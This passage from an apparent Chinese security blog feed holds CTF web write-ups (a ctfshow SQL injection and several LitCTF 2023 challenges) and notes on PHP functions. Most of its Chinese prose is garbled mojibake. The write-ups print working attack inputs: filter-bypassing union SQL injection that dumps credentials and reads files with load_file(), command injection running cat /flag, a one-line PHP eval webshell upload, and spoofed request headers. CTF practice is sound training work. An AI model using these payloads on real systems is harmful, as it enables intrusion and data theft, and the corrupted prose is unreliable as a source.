¼å¯ç”¨&#x2F;**&#x2F;ä»£æ›¿<br>åœ¨è¿™é‡Œæä¾›ä¸€ç§ç»•è¿‡çš„æ–¹æ³•â€”â€”åå¼•å·<br>åå¼•å·ï¼šä»–æ˜¯ä¸ºäº†åŒºåˆ†mysqlçš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦è€Œå¼•å…¥çš„ç¬¦å·<br>ä¾‹å¦‚ï¼š<code>information_schema.tableså’Œinformation_schema.`tables`  </code>éƒ½å¯ä»¥ä½¿ç”¨</p><p>æ¥ä¸‹æ¥ä½¿ç”¨è”åˆæ³¨å…¥<br><strong>çˆ†åº“(web)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>database()<br></code></pre></td></tr></table></figure><p><strong>çˆ†è¡¨(content)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/g</span>roup_concat(table_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.`tables`<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_schema=database()<br></code></pre></td></tr></table></figure><p><strong>çˆ†å­—æ®µ(id,username,password)</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/g</span>roup_concat(column_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.`columns`<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_name=<span class="hljs-string">&#x27;content&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>çˆ†å€¼</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/g</span>roup_concat(id,username,password)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>content<br></code></pre></td></tr></table></figure><p>çˆ†å€¼è¿™å‘ç°äº†é—®é¢˜<br><img src="/images/I1PJ.png"><br>å¹¶æ²¡æœ‰æ‰¾å‡ºflag<br>æå–å…³é”®å­— <strong>tell you a secret,secert has a secretâ€¦</strong><br>æ‰€ä»¥flagå¾ˆå¯èƒ½åœ¨secret.phpä¸­ï¼Œç°åœ¨æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ€ä¹ˆä»æ•°æ®åº“ä¸­æŸ¥çœ‹æ–‡ä»¶å†…å®¹å‘¢ï¼Œmysqlæä¾›äº†è¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•°load_file()<br>æ‰€ä»¥æˆ‘ä»¬æ„é€ è¯­å¥</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">-<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">secret</span>.<span class="hljs-params">php</span>&#x27;)</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å‘ç°äº†å¦‚ä¸‹å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;here_1s_your_f1ag.php&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">trim</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>)) === <span class="hljs-string">&#x27;ctf.show&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>);<br>&#125;<span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯å¦‚æœ&#x2F;tmp&#x2F;gtf1yä¸­çš„å†…å®¹ä¸ºctf.showåˆ™è¾“å‡º&#x2F;real_flag_is_hereä¸­çš„å€¼ï¼Œæˆ‘ä»¬æœ‰è¿™ä¸ªå‡½æ•°å¯ä»¥ç›´æ¥è¯»å–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼Œå‘ç°flagå·²ç»å‡ºç°åœ¨æºç ä¸­</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>litctf_2023</title>
    <link href="/2023/05/20/litctf_2023/"/>
    <url>/2023/05/20/litctf_2023/</url>
    
    <content type="html"><![CDATA[<h2 id="å¯¼å¼¹è¿·è¸ª"><a href="#å¯¼å¼¹è¿·è¸ª" class="headerlink" title="å¯¼å¼¹è¿·è¸ª"></a>å¯¼å¼¹è¿·è¸ª</h2><p>é¢˜ç›®æè¿°å·²ç»å‘Šè¯‰äº†ç­”æ¡ˆï¼Œåªè¦é€šè¿‡ç¬¬å…­å…³å°±èƒ½æ‹¿åˆ°flagï¼Œä¹Ÿæœ‰ä¸€ç§æ–¹æ³•ï¼Œ<br>ctrl+uæŸ¥çœ‹æºä»£ç <br>æ‹‰åˆ°æœ€ä¸‹é¢ï¼Œçœ‹åˆ°äº†ä¸€å †jsæ–‡ä»¶ï¼ŒæŒ¨ä¸ªè®¿é—®ï¼Œæœ€åæˆ‘ä»¬å†game.jsæ–‡ä»¶å‘ç°äº†å¾ˆå¤šlevalå…³é”®è¯ï¼Œctrl+få…¨å±€æœç´¢level<br>å‘ç°äº†flag<br><img src="/images/A9.png"></p><h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªå¯æ“ä½œçš„é­”æ–¹ï¼Œå®ƒå¹¶æ²¡æœ‰å‘Šè¯‰è·å¾—flagçš„æ–¹å¼ï¼Œè€Œä¸”é­”æ–¹æ˜¯æ²¡æœ‰æ‰“ä¹±çš„ï¼Œæ‰€ä»¥å¥½åƒå’Œé­”æ–¹å¹¶æ²¡æœ‰ä»€ä¹ˆå…³ç³»ï¼Œæˆ‘ä»¬æ‰“å¼€æºç <br>çªç„¶æƒ³åˆ°ä½œè€…åœ¨é¢˜ç›®æè¿°é‡Œæåˆ°äº†js<br><img src="/images/GJ.png"><br>æœç„¶æºç ä¸­æœ‰ä¸€ä¸ªjsæ–‡ä»¶å¯ä»¥ç‚¹å‡»<br><img src="/images/VG.png"><br>ç‚¹è¿›å»ï¼Œemmmã€‚ã€‚ã€‚å¥½å¤šä»£ç ï¼Œä¸è¦æ…Œ!å°è¯•ä»jsæˆ–æ³¨é‡Šæˆ–phpé‡Œå…¥æ‰‹ï¼Œctrl+få…¨å±€æœç´¢ä¸€ä¸‹ï¼Œjsæ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚æœç´¢æ³¨é‡Šï¼Œå¤ªå¤šäº†ï¼Œæœ€åå®åœ¨æ²¡åŠæ³•å†è€ƒè™‘ã€‚æœç´¢phpï¼Œæˆ‘ä»¬å‘ç°æœ‰ä¸€ä¸ªè¢«æ³¨é‡Šçš„phpæ–‡ä»¶<br><img src="/images/QI.png"><br>åœ¨urlä¸­è¾“å…¥åˆšåˆšçš„phpæ–‡ä»¶è¯•è¯•<br><img src="/images/KC.png"><br>è™½ç„¶çœ‹èµ·æ¥åƒä¹±ç ï¼Œä½†phpåº”è¯¥ä¸ä¼šä¹±æ¥ï¼Œæœç´¢æŸ¥é˜…ä¸€ä¸‹ï¼Œå‘ç°è¿™æ˜¯jsfuckåŠ å¯†<br><a href="http://www.hiencode.com/jsfuck.html">jsfuck</a><br>å¯†ç æé‡Œå¤´<br><img src="/images/EE.png"><br>å¾—åˆ°flagï¼Œè®°å¾—è¦æŠŠflagä¸­çš„[]æ‰‹åŠ¨åˆ é™¤å†æäº¤æ‰èƒ½æˆåŠŸé€šè¿‡</p><h2 id="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h2><p>é¢˜ç›®æè¿°é‡Œä½œè€…ç»™æˆ‘ä»¬é€æ¼flagä½äºæ ¹ç›®å½•<br>ç»™äº†ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œè¾“å…¥system(â€œlsâ€)<br><img src="/images/RR.png"><br>å‘ç°å¹¶æ²¡æœ‰flagï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ä½œè€…çš„æç¤ºï¼Œç›´æ¥system(â€œls &#x2F;â€œ)<br><img src="/images/5K.png"><br>æˆåŠŸå‘ç°flagæ–‡ä»¶ï¼Œcatå®ƒï¼Œsystem(â€œcat &#x2F;flagâ€);<br><img src="/images/2U.png"><br>æˆåŠŸè·å–flag</p><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p>ç›´æ¥system(â€œlsâ€)ä¸è¡Œ<br>è¾“å…¥ä¸€ä¸ªæ­£å¸¸ipï¼š127.0.0.1<br><img src="/images/F.png"><br>æœ‰æ˜¾ç¤ºç‚¹ï¼Œç”¨burpsuiteæŠ“åŒ…è¯•è¯•ï¼Œå‘ç°ipæ˜¯commandæ˜¾ç¤ºçš„ï¼Œä¿®æ”¹ä¸€ä¸‹commandçš„å†…å®¹<br><img src="/images/P.png"><br>æ²¡æœ‰å‘ç°flagï¼Œè¿”å›ä¸Šä¸€çº§çœ‹çœ‹<br><img src="/images/T5.png"><br>æˆåŠŸæ‰¾åˆ°</p><p>æ‰¾åˆ°ç›´æ¥æŠ“å°±å¯ä»¥äº†<br><img src="/images/U.png"><br>æˆåŠŸè·å–flag</p><h2 id="æˆ‘Flagå‘¢ï¼Ÿ"><a href="#æˆ‘Flagå‘¢ï¼Ÿ" class="headerlink" title="æˆ‘Flagå‘¢ï¼Ÿ"></a>æˆ‘Flagå‘¢ï¼Ÿ</h2><p>é¢˜å¾ˆç®€å•ï¼Œæ‰“å¼€æºç ï¼Œæœ€ä¸‹é¢å°±æ˜¯</p><h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p><img src="/images/T2O.png"></p><p>æ ¹æ®é¢˜æ„getï¼šCTF&#x3D;Lit2023<br>POSTï¼šChallenge&#x3D;iâ€™m_c0m1ng</p><p><img src="/images/LW.png"><br>åœ¨hackbarä¸Šæ“ä½œï¼Œå¾—åˆ°flag<br>è¾“å…¥ <a href="http://www.zip/">www.zip</a> å¯ä»¥æŸ¥çœ‹æºç ï¼Œè¿˜æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œä½†ä»€ä¹ˆä¹Ÿæ²¡å†™</p><h2 id="ä½œä¸šç®¡ç†ç³»ç»Ÿ"><a href="#ä½œä¸šç®¡ç†ç³»ç»Ÿ" class="headerlink" title="ä½œä¸šç®¡ç†ç³»ç»Ÿ"></a>ä½œä¸šç®¡ç†ç³»ç»Ÿ</h2><p>å…ˆè¿›å…¥æºç æŸ¥çœ‹ï¼Œç»™äº†è´¦æˆ·å’Œå¯†ç <br>è¿›å…¥å‘ç°å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ <br>é‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰æœ¨é©¬çš„phpæ–‡ä»¶è¯•è¯•<br>phpæ–‡ä»¶å†…å®¹ä¸º<?php eval($_POST['a']);?><br>ä¸Šä¼ æˆåŠŸåå†urlä¸­è¾“å…¥ä½ çš„phpæ–‡ä»¶åä»¥è¿›å…¥<br>æ‰“å¼€ä¸­å›½èšå‰‘ï¼Œå¤åˆ¶åˆšæ‰çš„urlåœ°å€<br><img src="/images/N69.png"><br>æˆåŠŸè¿›å…¥<br>æ¥ä¸‹æ¥åœ¨æ–‡ä»¶ä¸­æ‰¾flagå°±è¡Œäº†<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ï¼š<br>è¿›å…¥åˆ°ä½ æäº¤çš„æ–‡ä»¶åæ‰“å¼€hackbarï¼Œç”¨postæäº¤åˆ†åˆ«è¾“å…¥<br>a&#x3D;system(â€œlsâ€);<br>a&#x3D;system(â€œls &#x2F;â€œ);<br>a&#x3D;system(â€œcat &#x2F;flagâ€);</p><h2 id="vim-yyds"><a href="#vim-yyds" class="headerlink" title="vim yyds"></a>vim yyds</h2><p>vimç¼–è¾‘çš„index.phpæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘çŠ¶æ€å¼ºåˆ¶é€€å‡ºç»ˆç«¯ï¼Œä¼šåœ¨åŒç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ª.index.php.swpæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¿é—®.index.php.swpï¼Œä¸‹è½½ä¸‹æ¥<br>å½“æˆ‘ä»¬ä¸‹è½½ä¸‹æ¥ä¼šå‘ç°éƒ½æ˜¯ä¸€äº›ä¹±ç <br><img src="/images/SW.png"><br>å¾€ä¸‹ç¿»å‘ç°äº†æˆ‘ä»¬éœ€è¦çš„å†…å®¹ï¼Œä½†è¿™äº›å†…å®¹å´ä¸çŸ¥é“å®ƒä»¬çš„æ¬¡åºä¸æ˜¯å¦ä¸ºå®Œæ•´å†…å®¹<br>æˆ‘ä»¬å…ˆæå–å…³é”®å­—passwordä¸cmdéƒ½ä¸ºpostï¼Œpassword&#x3D;Give_Me_Your_Flagï¼Œä½†è¿˜æœ‰ä¸€ä¸ªif ($_POST[â€˜passwordâ€™] &#x3D;&#x3D;&#x3D; base64_encode($password)),æŠŠpasswordå†…å®¹ç¼–ç ä¸ºbase64å½¢å¼å³å¯ï¼Œæ¥ç€æˆ‘ä»¬å†çœ‹eval(system($_POST[â€˜cmdâ€™]));systemåœ¨å¤–é¢ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨cmdå†™å‘½ä»¤ï¼Œå…ˆè®©cmd&#x3D;lsè¯•è¯•<br><img src="/images/HC.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œé¡µé¢æˆåŠŸæ˜¾ç¤ºäº†å‘½ä»¤æ‰§è¡Œçš„ç»“æœ,æ¥ä¸‹æ¥å°±åˆ°äº†ç†Ÿæ‚‰çš„æ“ä½œäº†ï¼Œé¦–å…ˆçœ‹çœ‹æ ¹ç›®å½•ï¼Œcmd&#x3D;ls &#x2F;<br><img src="/images/H3S1.png"><br>å‘ç°flagï¼Œæ¥ä¸‹æ¥cmd&#x3D;cat &#x2F;flag<br>å³å¯å¾—å‡ºflagçš„å€¼</p><h2 id="http-pro-max-plus"><a href="#http-pro-max-plus" class="headerlink" title="http pro max plus"></a>http pro max plus</h2><p>è¿›å…¥é¡µé¢ï¼Œåªæ˜¾ç¤ºäº†ä¸€ä¸ª**åªå…è®¸æœ¬åœ°è®¿é—®ï¼ŒæŸ¥çœ‹æºç å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬burpsuiteæŠ“åŒ…è¯•è¯•<br>åªå…è®¸åœ¨æœ¬åœ°ä½¿ç”¨çš„è¯æˆ‘ä»¬å…ˆæ¥ä¸ªx-forwarded-for:127.0.0.1<br><img src="/images/POR.png"><br>æ˜¾ç¤ºä¸è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¢ä¸€ç§æ–¹å¼<br>client-ip: 127.0.0.1<br><img src="/images/G7.png"><br>æç¤ºæˆ‘ä»¬éœ€è¦from pornhub.com<br>é‚£æˆ‘ä»¬å†æ·»åŠ ä¸€ä¸ªreferer: pornhub.com<br><img src="/images/9D.png"><br>æ¥ç€é¡µé¢å†æç¤ºæˆ‘ä»¬éœ€è¦ç”¨chromeæµè§ˆå™¨<br>æ‰€ä»¥æˆ‘ä»¬æŠŠUAå¤´æ”¹ä¸ºChrome<br><img src="/images/S6.png"><br>è¿™æ—¶æœ‰æç¤ºäº†éœ€è¦å¼€ä»£ç†æ‰è¡Œ<br>é‚£ä¹ˆæˆ‘ä»¬å†æ·»åŠ ä¸€ä¸ªvia:Clash.win<br><img src="/images/shit.png"><br>è·å¾—äº†ä¸€ä¸ª.phpæ–‡ä»¶<br>è®¿é—®å®ƒ<br>è¿›å…¥äº†å‘ç°é™¤äº†step2å¤–å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ä¸œè¥¿<br>æ‰“å¼€æºç çœ‹çœ‹<br><img src="/images/dumu.png"><br>emmm,åˆæ˜¯ä¸€ä¸ªçº¿ç´¢<br>æ‰“å¼€å®ƒï¼Œç›´æ¥è·å¾—flag</p><h2 id="è¿™æ˜¯ä»€ä¹ˆï¼Ÿsqlï¼æ³¨ä¸€ä¸‹"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼Ÿsqlï¼æ³¨ä¸€ä¸‹" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼Ÿsqlï¼æ³¨ä¸€ä¸‹"></a>è¿™æ˜¯ä»€ä¹ˆï¼Ÿsqlï¼æ³¨ä¸€ä¸‹</h2><p><img src="/images/Y.png"><br>ç›´æ¥åˆ†æä¸Šå›¾ä¸­çš„è¯­å¥å¾—çŸ¥è¦é—­åˆè¯­å¥åˆ™è¦åŠ 6ä¸ªæ‹¬å·<br>é‚£ä¹ˆæˆ‘ä»¬å¼€å§‹å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p><img src="/images/DO.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/RV9CJ.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p><img src="/images/P2KH.png"></p><p>è¿™æ˜¯ä¸€ä¸ªå‡çš„flagï¼Œä¸èƒ½ç”¨è¿™ä¸ªæ–¹æ³•è§£é¢˜<br>ç”¨å¦ä¸€è¯­å¥æŸ¥æ‰¾</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata #<br></code></pre></td></tr></table></figure><p><img src="/images/2QN.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/QE1.png"></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>)))))) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> ctftraining.flag<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/images/CFC44N6.png"><br>è·å¾—flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸è§PHPè¯­æ³•</title>
    <link href="/2023/05/09/php/"/>
    <url>/2023/05/09/php/</url>
    
    <content type="html"><![CDATA[<h2 id="Include"><a href="#Include" class="headerlink" title="Include()"></a>Include()</h2><p>Include(â€˜â€˜)ç”¨äºè·å–æŒ‡å®šæ–‡ä»¶ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡æœ¬ï¼Œä»£ç å’Œæ ‡è®°ï¼Œå¹¶å¤åˆ¶åˆ°ä½¿ç”¨è¯¥è¯­å¥çš„  </p><p>æ–‡ä»¶ä¸­ï¼Œåœ¨æœåŠ¡å™¨æ‰§è¡Œä¹‹å‰ï¼Œå°†phpæ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°å¦ä¸€ä¸ªphpæ–‡ä»¶ã€‚</p><h2 id="substr-å‡½æ•°"><a href="#substr-å‡½æ•°" class="headerlink" title="substr()å‡½æ•°"></a>substr()å‡½æ•°</h2><p>è¯­æ³•ï¼š<br>Sub(string,start,Length)<br><strong>string:</strong>  å¿…é¡»ã€‚è§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚</p><blockquote><h4 id="start-å¿…é¡»ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚"><a href="#start-å¿…é¡»ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚" class="headerlink" title="start: å¿…é¡»ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚"></a>start: å¿…é¡»ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚</h4><ul><li>æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹</li><li>è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æŒ‡å®šä½ç½®å¼€å§‹</li><li>0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹</li></ul></blockquote><blockquote><h4 id="Length-å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚"><a href="#Length-å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚" class="headerlink" title="Length:å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚"></a>Length:å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚</h4><ul><li>   æ­£æ•° - ä» start å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›çš„é•¿åº¦</li><li>   è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›çš„é•¿åº¦</li></ul></blockquote><h2 id="intval-å‡½æ•°"><a href="#intval-å‡½æ•°" class="headerlink" title="intval()å‡½æ•°"></a>intval()å‡½æ•°</h2><p>intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚<br>intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p><blockquote><h4 id="int-intval-mixed-var-int-base-x3D-10"><a href="#int-intval-mixed-var-int-base-x3D-10" class="headerlink" title="int intval ( mixed $var [, int $base &#x3D; 10 ] )"></a>int intval ( mixed $var [, int $base &#x3D; 10 ] )</h4><ul><li>$varï¼šè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼ã€‚</li><li>$baseï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚</li></ul></blockquote><p>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š<br>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ<br>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ<br>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</p><h2 id="stype-alpha-å‡½æ•°"><a href="#stype-alpha-å‡½æ•°" class="headerlink" title="stype_alpha()å‡½æ•°"></a>stype_alpha()å‡½æ•°</h2><h4 id="ä½œç”¨ï¼š"><a href="#ä½œç”¨ï¼š" class="headerlink" title="ä½œç”¨ï¼š"></a>ä½œç”¨ï¼š</h4><p>ctype_alpha()å‡½æ•°æ˜¯PHPä¸­çš„å­—ç¬¦ç±»å‹(CType)å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ä»…åŒ…å«å­—æ¯ã€‚</p><p>å¦‚æœå­—ç¬¦ä¸²åªåŒ…å«å­—æ¯ï¼Œè¿”å›bool <strong>true</strong> ï¼Œå¦åˆ™è¿”å›bool <strong>false</strong>ã€‚</p><h4 id="è¯­æ³•ï¼š"><a href="#è¯­æ³•ï¼š" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h4><p>ctype_alpha(string):bool</p><h2 id="Is-numerice-å‡½æ•°"><a href="#Is-numerice-å‡½æ•°" class="headerlink" title="Is_numerice()å‡½æ•°:"></a>Is_numerice()å‡½æ•°:</h2><h4 id="ä½œç”¨ï¼š-1"><a href="#ä½œç”¨ï¼š-1" class="headerlink" title="ä½œç”¨ï¼š"></a>ä½œç”¨ï¼š</h4><p>å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚<br>è¿”å›å€¼ï¼š<br>å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEï¼Œæ³¨æ„æµ®ç‚¹å‹è¿”å› 1ï¼Œå³ TRUEã€‚</p><h2 id="hexdec-å‡½æ•°"><a href="#hexdec-å‡½æ•°" class="headerlink" 